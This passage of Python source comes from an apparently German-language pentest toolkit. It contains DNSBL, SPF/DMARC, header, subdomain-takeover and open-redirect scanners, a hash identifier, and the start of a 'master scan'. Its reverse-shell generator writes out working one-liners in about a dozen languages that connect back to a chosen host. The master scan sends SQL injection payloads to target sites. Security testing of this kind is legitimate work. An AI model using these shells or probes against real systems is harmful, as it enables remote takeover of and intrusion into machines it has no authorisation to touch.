        print(f"  {G}[✓] Keine offensichtliche CORS-Fehlkonfiguration.{R}")
    wait()


# ── 89  IP BLACKLIST CHECK ────────────────────────────────────
def ip_blacklist_check():
    hdr("IP BLACKLIST CHECK")
    print(f"  {DIM}Prüft IP gegen bekannte DNS-Blacklists (DNSBL).{R}\n")
    ip = inp("IP-Adresse")
    if not ip: wait(); return
    parts = ip.strip().split(".")
    if len(parts) != 4: print(f"  {G}[!] Ungültige IP{R}"); wait(); return
    rev = ".".join(reversed(parts))
    dnsbls = [
        "zen.spamhaus.org","bl.spamcop.net","b.barracudacentral.org",
        "dnsbl.sorbs.net","spam.dnsbl.sorbs.net","xbl.spamhaus.org",
        "sbl.spamhaus.org","pbl.spamhaus.org","dbl.spamhaus.org",
        "bl.mailspike.net","hostkarma.junkemailfilter.com",
        "dnsbl-1.uceprotect.net","dnsbl-2.uceprotect.net",
    ]
    div()
    listed = []
    clean  = []
    W = 74
    print(f"  {DG}╔{'═'*W}╗{R}")
    for dnsbl in dnsbls:
        query = f"{rev}.{dnsbl}"
        try:
            socket.gethostbyname(query)
            status = f"{G}[GELISTET]{R}"
            listed.append(dnsbl)
        except socket.gaierror:
            status = f"{DIM}[sauber ]{R}"
            clean.append(dnsbl)
        line = f"  {status}  {DG}{dnsbl:<40}{R}"
        print(f"  {DG}║{R}{_pad(line, W)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    if listed:
        print(f"  {G}⚠ IP auf {len(listed)} Blacklist(s) gefunden!{R}")
    else:
        print(f"  {G}[✓] IP ist auf keiner der {len(dnsbls)} Blacklists.{R}")
    wait()


# ── 90  REVERSE SHELL GENERATOR ──────────────────────────────
def revshell_gen():
    hdr("REVERSE SHELL GENERATOR")
    print(f"  {DIM}Generiert Reverse-Shell One-Liners für verschiedene Sprachen.{R}")
    print(f"  {DIM}Nur für autorisierte Pentests verwenden!{R}\n")
    lhost = inp("LHOST (deine IP)")
    lport = inp("LPORT [4444]") or "4444"
    if not lhost: wait(); return
    div()
    shells = {
        "Bash":         f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "Bash (mkfifo)":f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "Python3":      f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "Python2":      f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "Netcat":       f"nc -e /bin/sh {lhost} {lport}",
        "Netcat (mkfifo)":f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
        "PHP":          f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Perl":         f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
        "Ruby":         f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{lhost}\",{lport});while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        "Powershell":   f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "Java":         f"r = Runtime.getRuntime(); p = r.exec(new String[]{{'/bin/bash','-c','exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done'}}); p.waitFor();",
        "Golang":       f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go",
    }
    W = 74
    names = list(shells.keys())
    print(f"  {DG}╔{'═'*W}╗{R}")
    for i, name in enumerate(names, 1):
        print(f"  {DG}║{R}  {C}[{i:>2}]{R}  {YG}{name}{R}")
    print(f"  {DG}╚{'═'*W}╝{R}\n")
    choice = inp("Nummer")
    if choice.isdigit() and 1 <= int(choice) <= len(names):
        name = names[int(choice)-1]
        print(f"\n  {YG}{name}:{R}")
        print(f"  {G}{shells[name]}{R}\n")
        print(f"  {DIM}Listener: nc -lvnp {lport}{R}")
    wait()


# ── 91  WEBSITE MONITOR ───────────────────────────────────────
def website_monitor():
    hdr("WEBSITE MONITOR")
    print(f"  {DIM}Überwacht Webseite in Echtzeit auf Up/Down.{R}\n")
    url = inp("URL (z.B. https://example.com)")
    if not url: wait(); return
    if not url.startswith("http"): url = "https://" + url
    raw_int = inp("Check-Intervall Sekunden [10]") or "10"
    interval = int(raw_int) if raw_int.isdigit() else 10
    div()
    print(f"  {DG}Überwache {YG}{url}{R}  {DIM}— STRG+C zum Beenden{R}\n")
    up_count = 0; down_count = 0; total = 0
    try:
        while True:
            total += 1
            t0 = time.time()
            status = "?"
            code   = 0
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as r:
                    code = r.status
                ms   = int((time.time()-t0)*1000)
                status = f"{G}UP{R}"
                detail = f"{G}{code}{R}  {DIM}{ms}ms{R}"
                up_count += 1
            except urllib.error.HTTPError as e:
                ms   = int((time.time()-t0)*1000)
                status = f"{YG}WARN{R}"
                detail = f"{YG}{e.code}{R}  {DIM}{ms}ms{R}"
                up_count += 1
            except Exception as e:
                status = f"{G}DOWN{R}"
                detail = f"{G}{str(e)[:30]}{R}"
                down_count += 1
            ts = datetime.now().strftime("%H:%M:%S")
            uprate = int(up_count/total*100)
            print(f"  {DIM}[{ts}]{R}  {status}  {detail}   {DIM}Up:{R}{G}{uprate}%{R}  {DIM}({up_count}/{total}){R}")
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n  {DIM}Gestoppt.{R}")
    div()
    print(f"  {G}Uptime: {int(up_count/max(total,1)*100)}%{R}  {DIM}({up_count} up / {down_count} down / {total} checks){R}")
    wait()


# ── 92  SPF / DMARC CHECKER ──────────────────────────────────
def spf_dmarc_checker():
    hdr("SPF / DMARC / DKIM CHECKER")
    print(f"  {DIM}Prüft E-Mail-Sicherheitseinträge einer Domain.{R}\n")
    domain = inp("Domain (z.B. example.com)")
    if not domain: wait(); return
    div()
    checks_q = [
        ("SPF",   domain,         "TXT", r'v=spf1[^\n]*'),
        ("DMARC", f"_dmarc.{domain}", "TXT", r'v=DMARC1[^\n]*'),
        ("DKIM",  f"default._domainkey.{domain}", "TXT", r'v=DKIM1[^\n]*'),
        ("MX",    domain,         "MX",  None),
    ]
    for label, q, rtype, pat in checks_q:
        _spinner(f"Prüfe {label} ...", 0.5)
        try:
            out = subprocess.check_output(
                ["nslookup", f"-type={rtype}", q],
                stderr=subprocess.DEVNULL, timeout=8
            ).decode(errors="ignore")
            if pat:
                m = re.search(pat, out)
                if m:
                    print(f"  {G}[✓] {label:<6}{R}  {DG}{m.group(0)[:60]}{R}")
                else:
                    print(f"  {G}[✗] {label:<6}{R}  {DIM}Kein {label}-Eintrag gefunden → Spoofing möglich!{R}")
            else:
                mx = re.findall(r'mail exchanger = (\S+)', out)
                if mx:
                    print(f"  {G}[✓] MX     {R}  {DG}{', '.join(mx[:3])}{R}")
                else:
                    print(f"  {G}[✗] MX     {R}  {DIM}Keine MX-Einträge{R}")
        except Exception as e:
            print(f"  {DIM}[?]  {label:<6}{R}  {G}{e}{R}")
    wait()


# ── 93  SUBDOMAIN TAKEOVER CHECK ─────────────────────────────
def subdomain_takeover():
    hdr("SUBDOMAIN TAKEOVER CHECKER")
    print(f"  {DIM}Prüft Subdomains auf mögliche Takeover-Schwachstellen.{R}\n")
    domain = inp("Domain (z.B. example.com)")
    if not domain: wait(); return
    subs_raw = inp("Subdomain-Liste (kommagetrennt) oder ENTER für Standard")
    if subs_raw.strip():
        subs = [s.strip() for s in subs_raw.split(",")]
    else:
        subs = ["www","mail","dev","api","staging","beta","test","old",
                "cdn","assets","static","media","shop","blog","admin",
                "vpn","mx","smtp","ftp","portal","app","docs","help"]
    takeover_sigs = {
        "GitHub Pages":       ("there isn't a github pages site here","github.io"),
        "Heroku":             ("no such app","herokuapp.com"),
        "Netlify":            ("not found","netlify.app"),
        "AWS S3":             ("nosuchbucket","s3.amazonaws.com"),
        "Zendesk":            ("help center closed","zendesk.com"),
        "Shopify":            ("sorry, this shop is currently unavailable","myshopify.com"),
        "Fastly":             ("fastly error: unknown domain","fastly.net"),
        "Ghost":              ("the thing you were looking for is no longer here","ghost.io"),
        "Cargo":              ("if you're moving your domain away from cargo","cargocollective.com"),
    }
    div()
    vulnerable = []
    for sub in subs:
        fqdn = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(fqdn)
        except:
            continue
        try:
            req = urllib.request.Request(f"http://{fqdn}", headers={"User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=5) as r:
                body = r.read(4096).decode(errors="ignore").lower()
            for provider, (sig, _) in takeover_sigs.items():
                if sig in body:
                    print(f"  {G}[VULN!] {fqdn:<35} → {provider}{R}")
                    vulnerable.append(fqdn)
                    break
            else:
                print(f"  {DIM}[ OK  ] {fqdn:<35} → {ip}{R}")
        except:
            print(f"  {DIM}[    ] {fqdn:<35} → {ip} (kein HTTP){R}")
    div()
    if vulnerable:
        print(f"  {G}⚠ {len(vulnerable)} mögliche Takeover-Ziele gefunden!{R}")
    else:
        print(f"  {G}[✓] Keine Takeover-Schwachstellen gefunden.{R}")
    wait()


# ── 94  LIVE NETWORK STATS ────────────────────────────────────
def live_net_stats():
    hdr("LIVE NETZWERK-STATISTIKEN")
    print(f"  {DIM}Zeigt Echtzeit-Netzwerkauslastung — STRG+C zum Beenden.{R}\n")
    div()
    def _get_net_bytes():
        try:
            if os.name == "nt":
                out = subprocess.check_output(
                    ["netstat", "-e"], stderr=subprocess.DEVNULL
                ).decode(errors="ignore")
                nums = re.findall(r'\d+', out)
                if len(nums) >= 4:
                    return int(nums[0]), int(nums[2])
            else:
                with open("/proc/net/dev") as f:
                    lines = f.readlines()
                rx = tx = 0
                for line in lines[2:]:
                    parts = line.split()
                    if len(parts) >= 10 and "lo" not in parts[0]:
                        rx += int(parts[1]); tx += int(parts[9])
                return rx, tx
        except: pass
        return 0, 0

    prev_rx, prev_tx = _get_net_bytes()
    prev_t = time.time()
    max_speed = 1
    try:
        while True:
            time.sleep(1)
            rx, tx = _get_net_bytes()
            now = time.time()
            dt  = now - prev_t
            drx = max(0, rx - prev_rx) / dt
            dtx = max(0, tx - prev_tx) / dt
            prev_rx, prev_tx, prev_t = rx, tx, now
            max_speed = max(max_speed, drx, dtx)
            brx = int(drx / max_speed * 30)
            btx = int(dtx / max_speed * 30)
            def fmt(b):
                if b > 1024*1024: return f"{b/1024/1024:6.1f} MB/s"
                if b > 1024:      return f"{b/1024:6.1f} KB/s"
                return f"{b:6.0f}  B/s"
            bar_rx = f"{G}{'█'*brx}{DIM}{'░'*(30-brx)}{R}"
            bar_tx = f"{C}{'█'*btx}{DIM}{'░'*(30-btx)}{R}"
            ts = datetime.now().strftime("%H:%M:%S")
            print(f"  {DIM}[{ts}]{R}  {G}↓{R} {bar_rx}  {DG}{fmt(drx)}{R}")
            print(f"  {DIM}       {R}  {C}↑{R} {bar_tx}  {DG}{fmt(dtx)}{R}")
            print()
    except KeyboardInterrupt:
        print(f"\n  {DIM}Gestoppt.{R}")
    wait()


# ── 95  HASH IDENTIFIER ───────────────────────────────────────
def hash_identifier():
    hdr("HASH IDENTIFIER")
    print(f"  {DIM}Erkennt automatisch den Hash-Typ.{R}\n")
    h = inp("Hash eingeben")
    if not h: wait(); return
    h = h.strip()
    div()
    patterns = [
        (r'^[a-f0-9]{32}$',   "MD5 (128-bit)"),
        (r'^[a-f0-9]{40}$',   "SHA-1 (160-bit)"),
        (r'^[a-f0-9]{56}$',   "SHA-224 (224-bit)"),
        (r'^[a-f0-9]{64}$',   "SHA-256 (256-bit)"),
        (r'^[a-f0-9]{96}$',   "SHA-384 (384-bit)"),
        (r'^[a-f0-9]{128}$',  "SHA-512 (512-bit)"),
        (r'^\$2[aby]\$.{56}$',"bcrypt"),
        (r'^\$1\$.{8}\$.{22}$',"MD5-Crypt (Unix)"),
        (r'^\$6\$.{8,16}\$.+$',"SHA-512-Crypt (Unix)"),
        (r'^[a-f0-9]{32}:[a-f0-9]{32}$',"MD5 + Salt"),
        (r'^[a-zA-Z0-9+/]{24}=$',"Base64 (MD5 likely)"),
        (r'^[a-f0-9]{8}$',    "CRC32"),
        (r'^\*[A-F0-9]{40}$', "MySQL5 Hash"),
        (r'^[a-f0-9]{16}$',   "MySQL 3.x / DES"),
        (r'^U\$[a-zA-Z0-9./]{13}$',"DES (Unix)"),
        (r'^\{SHA\}[a-zA-Z0-9+/=]{28}$', "SHA-1 Base64 (LDAP)"),
        (r'^[a-f0-9]{48}$',   "Tiger-192"),
        (r'^[a-f0-9]{56}$',   "SHA-224 / Haval-224"),
    ]
    matches = []
    for pat, name in patterns:
        if re.match(pat, h, re.IGNORECASE):
            matches.append(name)
    W = 74
    print(f"  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {YG}HASH: {DIM}{h[:60]}{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    is_hex = all(c in "0123456789abcdefABCDEF" for c in h)
    print(f"  {DG}║{R}{_pad(f'  {DIM}Länge: {len(h)} Zeichen  |  Hex: {is_hex}{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    if matches:
        for m in matches:
            print(f"  {DG}║{R}  {G}[✓]{R}  {YG}{m}{R}")
    else:
        print(f"  {DG}║{R}  {DIM}Kein bekanntes Muster erkannt.{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 96  PAYLOAD ENCODER ──────────────────────────────────────
def payload_encoder():
    hdr("PAYLOAD ENCODER / DECODER")
    print(f"  {DIM}Enkodiert/Dekodiert Payloads für Pentesting.{R}\n")
    text = inp("Text / Payload")
    if not text: wait(); return
    div()
    import urllib.parse as _up
    encodings = {
        "URL-Encode":     _up.quote(text, safe=''),
        "URL-Encode ++":  _up.quote_plus(text),
        "Base64":         base64.b64encode(text.encode()).decode(),
        "Base64 URL-safe":base64.urlsafe_b64encode(text.encode()).decode(),
        "Hex":            text.encode().hex(),
        "HTML Entities":  text.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;").replace("'","&#x27;"),
        "Unicode Escape": text.encode('unicode_escape').decode(),
        "Double URL":     _up.quote(_up.quote(text, safe=''), safe=''),
        "ROT13":          text.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                                                        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')),
    }
    W = 74
    print(f"  {DG}╔{'═'*W}╗{R}")
    for label, val in encodings.items():
        print(f"  {DG}║{R}  {C}{label:<18}{R}  {G}{val[:50]}{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 97  OPEN REDIRECT FINDER ─────────────────────────────────
def open_redirect_finder():
    RED = "[91m"; BRED = "[1;91m"
    hdr("OPEN REDIRECT FINDER")
    print(f"  {DIM}Sucht nach Open-Redirect-Schwachstellen in Parametern.{R}\n")
    target = inp("URL mit Parameter (z.B. https://example.com/?next=FUZZ)")
    if not target or "FUZZ" not in target:
        target = inp("Base-URL (Parameter werden automatisch getestet)")
        if not target: wait(); return
        if not target.startswith("http"): target = "https://" + target
        payloads_tpl = [
            f"{target}?url=FUZZ", f"{target}?redirect=FUZZ", f"{target}?next=FUZZ",
            f"{target}?return=FUZZ", f"{target}?goto=FUZZ", f"{target}?dest=FUZZ",
        ]
    else:
        payloads_tpl = [target]
    div()
    test_vals = ["https://evil.com", "//evil.com", "/\\evil.com", "https:evil.com"]
    vuln_found = False
    for tpl in payloads_tpl:
        for val in test_vals:
            url = tpl.replace("FUZZ", urllib.parse.quote(val, safe='') if 'urllib' in dir() else val)
            try:
                req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=5) as r:
                    final = r.url
                if "evil.com" in final:
                    print(f"  {G}[VULN!]{R}  {YG}{url[:60]}{R}")
                    print(f"  {DIM}        Weitergeleitet zu: {final}{R}")
                    vuln_found = True
                else:
                    print(f"  {DIM}[OK]   {url[:60]}{R}")
            except urllib.error.HTTPError as e:
                if e.code in (301, 302, 303, 307, 308):
                    loc = e.headers.get("Location","")
                    if "evil.com" in loc:
                        print(f"  {G}[VULN!]{R}  {YG}{url[:60]}{R}  →  {G}{loc}{R}")
                        vuln_found = True
                    else:
                        print(f"  {DIM}[OK]   {url[:60]} → {loc[:30]}{R}")
                else:
                    print(f"  {DIM}[{e.code}]  {url[:60]}{R}")
            except: pass
    div()
    if not vuln_found:
        print(f"  {G}[✓] Keine Open Redirects gefunden.{R}")
    wait()


# ── 98  TECHNOLOGY SCANNER ────────────────────────────────────
def full_tech_scan():
    hdr("FULL TECHNOLOGY SCANNER")
    print(f"  {DIM}Detaillierter Technologie-Scan einer Website.{R}\n")
    url = inp("URL (z.B. https://example.com)")
    if not url: wait(); return
    if not url.startswith("http"): url = "https://" + url
    div()
    try:
        req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
        with urllib.request.urlopen(req, timeout=10) as r:
            headers = dict(r.headers)
            body    = r.read(32768).decode(errors="ignore")
            final   = r.url
        _spinner("Analysiere ...", 0.8)
        techs = []
        # Frameworks & CMS
        if "wp-content" in body or "wp-includes" in body:
            techs.append(("WordPress",  "CMS"))
        if "joomla" in body.lower():
            techs.append(("Joomla",     "CMS"))
        if "drupal" in body.lower():
            techs.append(("Drupal",     "CMS"))
        if "laravel" in body.lower() or "laravel_session" in str(headers):
            techs.append(("Laravel",    "PHP-Framework"))
        if "django" in body.lower() or "csrfmiddlewaretoken" in body:
            techs.append(("Django",     "Python-Framework"))
        if "react" in body.lower() and ("__react" in body or "ReactDOM" in body):
            techs.append(("React",      "JS-Framework"))
        if "ng-version" in body or "angular" in body.lower():
            techs.append(("Angular",    "JS-Framework"))
        if "vue" in body.lower() and "__vue__" in body:
            techs.append(("Vue.js",     "JS-Framework"))
        if "next.js" in body.lower() or "__NEXT_DATA__" in body:
            techs.append(("Next.js",    "React-Framework"))
        if "jquery" in body.lower():
            v = re.search(r'jquery[/-](\d+\.\d+[\d.]*)', body, re.IGNORECASE)
            techs.append((f"jQuery {v.group(1) if v else ''}", "JS-Library"))
        if "bootstrap" in body.lower():
            techs.append(("Bootstrap",  "CSS-Framework"))
        if "shopify" in body.lower():
            techs.append(("Shopify",    "E-Commerce"))
        if "cloudflare" in str(headers).lower():
            techs.append(("Cloudflare", "CDN/WAF"))
        # HTTP Headers
        server = headers.get("Server","")
        if server: techs.append((server,  "Webserver"))
        powered = headers.get("X-Powered-By","")
        if powered: techs.append((powered, "Backend"))
        via = headers.get("Via","")
        if via: techs.append((via, "Proxy/CDN"))
        # Security Headers
        sec = []
        for sh in ["Strict-Transport-Security","Content-Security-Policy",
                   "X-Frame-Options","X-Content-Type-Options","X-XSS-Protection"]:
            if sh in headers: sec.append(sh.split("-")[-1])
            else: sec.append(f"FEHLT:{sh.split('-')[-1]}")
        W = 74
        print(f"  {DG}╔{'═'*W}╗{R}")
        print(f"  {DG}║{R}{_pad(f'  {YG}TECHNOLOGIEN: {final[:40]}{R}', W)}{DG}║{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")
        if techs:
            for name, cat in techs:
                line = f"  {C}{cat:<18}{R}  {G}{name}{R}"
                print(f"  {DG}║{R}{_pad(line, W)}{DG}║{R}")
        else:
            print(f"  {DG}║{R}{_pad(f'  {DIM}Keine bekannten Technologien erkannt.{R}', W)}{DG}║{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}{_pad(f'  {YG}SECURITY HEADERS:{R}', W)}{DG}║{R}")
        for s in sec:
            ok = not s.startswith("FEHLT:")
            icon = f"{G}[✓]{R}" if ok else f"{G}[✗]{R}"
            nm   = s.replace("FEHLT:","") if not ok else s
            line = f"  {icon}  {DIM if not ok else G}{nm}{R}"
            print(f"  {DG}║{R}{_pad(line, W)}{DG}║{R}")
        print(f"  {DG}╚{'═'*W}╝{R}")
    except Exception as e:
        print(f"  {G}[!] {e}{R}")
    wait()


# ── 99  ARP SCANNER (LAN) ────────────────────────────────────
def arp_scanner():
    hdr("ARP SCANNER — LAN GERÄTE")
    print(f"  {DIM}Findet alle aktiven Geräte im lokalen Netzwerk via ARP.{R}\n")
    try:
        if os.name == "nt":
            out = subprocess.check_output(["arp", "-a"], stderr=subprocess.DEVNULL).decode(errors="ignore")
        else:
            out = subprocess.check_output(["arp", "-n"], stderr=subprocess.DEVNULL).decode(errors="ignore")
    except:
        print(f"  {G}[!] ARP nicht verfügbar.{R}"); wait(); return
    div()
    devices = []
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 2:
            ip  = re.search(r'(\d{1,3}\.){3}\d{1,3}', line)
            mac = re.search(r'([0-9a-fA-F]{2}[:\-]){5}[0-9a-fA-F]{2}', line)
            if ip and mac:
                devices.append((ip.group(), mac.group()))
    W = 74
    print(f"  {DG}╔{'═'*W}╗{R}")
    h = _pad(f"  {YG}ARP-TABELLE — {len(devices)} Geräte{R}", W)
    print(f"  {DG}║{R}{h}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}{_pad(f'  {DIM}IP-ADRESSE          MAC-ADRESSE          HOSTNAME{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")
    for ip, mac in devices:
        try: host = socket.gethostbyaddr(ip)[0][:20]
        except: host = ""
        line = f"  {G}{ip:<20}{R}  {DG}{mac:<22}{R}  {DIM}{host}{R}"
        print(f"  {DG}║{R}{_pad(line, W)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")
    wait()


# ── 105  MASTER SECURITY SCAN ────────────────────────────────
def master_scan():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    GRN  = "\033[92m"; YEL  = "\033[93m"
    BLU  = "\033[96m"; DIM2 = "\033[2m"
    hdr("MASTER SECURITY SCAN")
    print(f"  {BRED}Führt ALLE Scans zusammen aus und gibt einen Komplett-Report aus.{R}")
    print(f"  {DIM}Nur auf eigene/autorisierte Ziele!{R}\n")

    base = inp("Ziel-URL (z.B. https://example.com)")
    if not base: wait(); return
    if not base.startswith("http"): base = "http://" + base
    base = base.rstrip("/")
    login_url = inp(f"Login-URL [{base}/login]") or base + "/login"
    if not login_url.startswith("http"): login_url = base + "/" + login_url.lstrip("/")

    W = 74
    all_findings = []   # (severity 0-3, kategorie, name, detail, erkl, fix)

    def _req(url, method="GET", data=None, hdrs=None, timeout=6):
        h = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
        if hdrs: h.update(hdrs)
        try:
            bd = urllib.parse.urlencode(data).encode() if isinstance(data, dict) \
                 else (data.encode() if isinstance(data, str) else data)
            req = urllib.request.Request(url, data=bd, method=method, headers=h)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                return r.status, dict(r.headers), r.read(16384).decode(errors="ignore"), r.url
        except urllib.error.HTTPError as e:
            try: b = e.read(4096).decode(errors="ignore")
            except: b = ""
            return e.code, dict(e.headers), b, url
        except Exception as ex:
            return 0, {}, str(ex), url

    def _hit(sev, kat, name, detail, erkl, fix):
        all_findings.append((sev, kat, name, detail, erkl, fix))
        lbl = f"{BRED}[KRIT]{R}" if sev==3 else f"{RED}[HOCH]{R}" if sev==2 else f"{YEL}[WARN]{R}" if sev==1 else f"{DIM2}[INFO]{R}"
        print(f"  {DG}║{R}  {lbl}  {YEL}{name:<28}{R}  {DIM2}{detail[:26]}{R}")

    def _ok(name):
        print(f"  {DG}║{R}  {GRN}[ OK ]{R}  {DIM2}{name}{R}")

    def _section(title, n, total):
        print(f"  {DG}╠{'═'*W}╣{R}")
        pct = int(n/total*20)
        bar = f"{GRN}{'█'*pct}{DIM2}{'░'*(20-pct)}{R}"
        print(f"  {DG}║{R}  {BLU}[{n}/{total}]{R}  {bar}  {YEL}{title}{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")

    # Initiales Banner
    clear(); print(BANNER)
    print(f"  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {BRED}▶ MASTER SCAN  {DIM2}—  {YEL}{base}{R}', W)}{DG}║{R}")
    print(f"  {DG}╚{'═'*W}╝{R}")
    print(f"  {DG}╔{'═'*W}╗{R}")

    TOTAL = 32

    # ═══ 1. ERREICHBARKEIT & SERVER ═══════════════════════════
    _section("SERVER & VERBINDUNG", 1, TOTAL)
    c0, hdrs0, body0, final0 = _req(base)
    if c0 == 0:
        _hit(3,"SERVER","Nicht erreichbar", "Kein HTTP-Kontakt",
             "Server antwortet nicht.", "Domain/IP prüfen.")
    else:
        _ok(f"Erreichbar — HTTP {c0}")
    server  = hdrs0.get("Server","")
    powered = hdrs0.get("X-Powered-By","")
    if server:  _hit(1,"SERVER","Server-Banner",  server[:30],
                     "Versionsnummer verrät angreifbare Software.",
                     "Server-Header unterdrücken: ServerTokens Prod (Apache).")
    if powered: _hit(1,"SERVER","X-Powered-By",  powered[:30],
                     "Technologie-Stack öffentlich sichtbar.",
                     "Header entfernen: header_remove X-Powered-By (PHP).")
    if not base.startswith("https"):
        _hit(2,"SERVER","Kein HTTPS", base,
             "Verbindung unverschlüsselt — Passwörter/Cookies sichtbar.",
             "SSL-Zertifikat einrichten (Let's Encrypt kostenlos).")
    else:
        _ok("HTTPS aktiv")

    # ═══ 2. SECURITY HEADERS ══════════════════════════════════
    _section("SECURITY HEADERS", 2, TOTAL)
    hdr_checks = [
        ("Strict-Transport-Security", 2, "HSTS fehlt — MITM-Angriff möglich",
         "Strict-Transport-Security: max-age=31536000; includeSubDomains"),
        ("Content-Security-Policy",   2, "CSP fehlt — XSS einfacher",
         "Content-Security-Policy: default-src 'self'"),
        ("X-Frame-Options",           1, "Clickjacking möglich",
         "X-Frame-Options: DENY"),
        ("X-Content-Type-Options",    1, "MIME-Sniffing möglich",
         "X-Content-Type-Options: nosniff"),
        ("Referrer-Policy",           0, "Referrer-Policy fehlt",
         "Referrer-Policy: no-referrer"),
        ("Permissions-Policy",        0, "Permissions-Policy fehlt",
         "Permissions-Policy: geolocation=(), camera=()"),
    ]
    for hname, sev, erkl, fix in hdr_checks:
        if hname not in hdrs0:
            _hit(sev, "HEADERS", hname, "fehlt",
                 erkl, f"Setze: {fix}")
        else:
            _ok(f"{hname}: OK")

    # ═══ 3. COOKIES ═══════════════════════════════════════════
    _section("COOKIES", 3, TOTAL)
    ck = hdrs0.get("Set-Cookie","")
    if ck:
        if "httponly" not in ck.lower():
            _hit(2,"COOKIES","HttpOnly fehlt", ck[:25],
                 "Cookies per JavaScript lesbar → XSS kann Cookies stehlen.",
                 "Set-Cookie: ...; HttpOnly")
        if "secure" not in ck.lower():
            _hit(2,"COOKIES","Secure fehlt", ck[:25],
                 "Cookie wird über HTTP übertragen.",
                 "Set-Cookie: ...; Secure")
        if "samesite" not in ck.lower():
            _hit(1,"COOKIES","SameSite fehlt", ck[:25],
                 "CSRF über Cookie möglich.",
                 "Set-Cookie: ...; SameSite=Strict")
        else:
            _ok("Cookie-Flags OK")
    else:
        _ok("Keine Cookies gesetzt")

    # ═══ 4. SQL INJECTION ════════════════════════════════════
    _section("SQL INJECTION", 4, TOTAL)
    sqli_hits = []
    for pay, sigs in [
        ("'",            ["sql syntax","mysql_fetch","you have an error","warning: mysql","odbc","sqlite3"]),
        ("1 OR 1=1--",   ["welcome","dashboard","logged"]),
        ("' UNION SELECT NULL--", ["union","null"]),
        ("1; SLEEP(2)--",[]),
    ]:
        for sep in ["?id=","?q=","?search=","?user=","?page="]:
            url_t = f"{base}/{sep}{urllib.parse.quote(pay, safe='')}"
            t0 = time.time()
            c2,_,b2,_ = _req(url_t)
            dt = time.time()-t0
            b2l = b2.lower()
            if sigs and any(s in b2l for s in sigs):
                sqli_hits.append(f"{sep}{pay[:20]}")
                break
            if not sigs and dt > 1.7:
                sqli_hits.append(f"Time-based {sep}")
                break
        if sqli_hits: break
    if sqli_hits:
        _hit(3,"INJECTION","SQL Injection", sqli_hits[0],
             "Nutzereingaben direkt in SQL eingebaut — Login/DB kompromittierbar.",
             "Prepared Statements verwenden — niemals Strings in SQL bauen.")
    else:
        _ok("SQL Injection: kein Fehler")

    # ═══ 5. XSS ══════════════════════════════════════════════
    _section("XSS (Cross-Site Scripting)", 5, TOTAL)
    xss_hit = None
